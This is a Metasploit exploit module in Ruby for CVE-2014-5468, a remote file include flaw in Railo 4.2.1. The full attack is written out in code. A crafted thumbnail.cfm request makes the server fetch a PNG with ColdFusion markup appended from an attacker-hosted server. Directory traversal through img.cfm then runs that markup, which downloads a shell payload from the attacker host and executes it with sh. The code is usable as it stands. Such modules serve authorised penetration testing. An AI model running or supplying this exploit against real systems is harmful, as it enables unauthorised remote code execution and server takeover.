##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit4 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::Remote::HttpServer

  def initialize(info = {})
    super(update_info(info,
                      'Name' => 'Railo Remote File Include',
                      'Description' => '
                      This module exploits a remote file include vulnerability in Railo,
                      tested against version 4.2.1. First, a call using a vulnerable
                      <cffile> line in thumbnail.cfm allows an atacker to download an
                      arbitrary PNG file. By appending a .cfm, and taking advantage of
                      a directory traversal, an attacker can append cold fusion markup
                      to the PNG file, and have it interpreted by the server. This is
                      used to stage and execute a fully-fledged payload.
                                            ',
                      'License' => MSF_LICENSE,
                      'Author' => [
                        'Bryan Alexander <drone@ballastsecurity.net>', # Discovery/PoC
                        'bperry' # metasploited
                      ],
                      'References' => [
                        ['CVE', '2014-5468'],
                        ['URL', 'http://hatriot.github.io/blog/2014/08/27/railo-security-part-four/']
                      ],
                      'Payload' => {
                        'Space' => 99999, # if there is disk space, I think we will fit
                        'BadChars' => "",
                        'DisableNops' => true,
                        'Compat' => {
                          'PayloadType' => 'cmd',
                          'RequiredCmd' => 'generic netcat perl ruby python bash telnet'
                        }
                      },
                      'Platform' => %w(                      unix                      ),
                      'Targets' =>
                      [
                        [
                          'Automatic',
                          {
                            'Platform' => [ 'unix' ],
                            'Arch' => ARCH_CMD
                          }
                        ]
                      ],
                      'DefaultTarget' => 0,
                      'DisclosureDate' => 'Aug 26 2014'))

    register_options(
      [
        OptString.new('TARGETURI', [true, 'The base URI of the Railo server', '/railo-context/']),
        OptInt.new('STAGEWAIT', [true, 'Number of seconds to wait for stager to download', 10])
      ], self.class)
  end

  def check
    md5 = '6de48cb72421cfabdce440077a921b25' # /res/images/id.png

    res = send_request_cgi(
      'uri' => normalize_uri('res', 'images', 'id.png') # the targeturi is not used in this request
    )

    if !res
      fail_with(Failure::Unknown, 'Server did not respond')
    elsif !res.body
      fail_with(Failure::Unknown, "Server responded without a body: #{res.code} #{res.message}")
    end

    new_md5 = Rex::Text.md5(res.body)

    return Exploit::CheckCode::Appears if new_md5 == md5

    Exploit::CheckCode::Safe
  end

  def exploit
    if datastore['SRVHOST'] == '0.0.0.0'
      fail_with(Failure::BadConfig, 'SRVHOST must be an IP address accessible from another computer')
    end

    url = 'http://' + datastore['SRVHOST'] + ':' + datastore['SRVPORT'].to_s

    @shell_name = Rex::Text.rand_text_alpha(15)
    stager_name = Rex::Text.rand_text_alpha(15) + '.cfm'

    start_service('Uri' => {
                    'Proc' => proc do |cli, req|
                      on_request_stager(cli, req)
                    end,
                    'Path' => '/' + stager_name
                  })

    start_service('Uri' => {
                    'Proc' => proc do |cli, req|
                      on_request_shell(cli, req)
                    end,
                    'Path' => '/' + @shell_name
                  })

    wh = '5000' # width and height

    res = send_request_cgi(
      'uri' => normalize_uri(target_uri.path, 'admin', 'thumbnail.cfm'),
      'vars_get' => {
        'img' => url + '/' + stager_name,
        'height' => wh,
        'width' => wh
      }
    )

    if !res
      fail_with(Failure::Unknown, 'Server did not respond')
    elsif res.code != 500
      fail_with(Failure::Unknown, "Server did not respond with the expected HTTP 500: #{res.code} #{res.message}")
    end

    print_status('Waiting for first stage to download...')

    i = datastore['STAGEWAIT']
    while !@staged && i > 0
      select(nil, nil, nil, 1)
      print_status("Waiting for #{i} more seconds...")
      i = i - 1
    end

    @staged = false

    if i == 0
      fail_with(Failure::Unknown, 'Server did not request the stager.')
    end

    hash = Rex::Text.md5("#{url + "/" + stager_name}-#{wh}-#{wh}") # 5000 is width and height from GET

    hash.upcase!

    print_status('Executing stager')

    send_request_cgi(
      'uri' => normalize_uri(target_uri.path, 'admin', 'img.cfm'),
      'vars_get' => {
        'attributes.src' => '../../../../temp/admin-ext-thumbnails/' + hash,
        'thistag.executionmode' => 'start'
      }
    )
  end

  def on_request_shell(cli, _request)
    print_status('Sending payload')
    send_response(cli, payload.encoded, {})
    handler(cli)
  end

  def on_request_stager(cli, _request)
    url = 'http://' + datastore['SRVHOST'] + ':' + datastore['SRVPORT'].to_s + '/' + @shell_name

    stager = "<cfhttp method='get' url='#{url}'"
    stager << " path='#GetDirectoryFromPath(GetCurrentTemplatePath())#..\\..\\..\\..\\..\\..\\'"
    stager << " file='#{@shell_name}'>"
    stager << "<cfexecute name='sh' arguments='#{@shell_name}' timeout='99999'></cfexecute>"

    png = 'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcS'
    png << 'JAAAACklEQVR4nGMAAQAABQABDQottAAAAABJRU5ErkJggg=='

    # A very small PNG file
    png = Rex::Text.decode_base64(png)

    stager.each_byte do |b|
      png << b
    end

    png << 0x00

    print_status('Sending stage. This might be sent multiple times.')
    send_response(cli, png,  'Content-Type' => 'image/png')

    @staged = true

    handler(cli)
  end
end
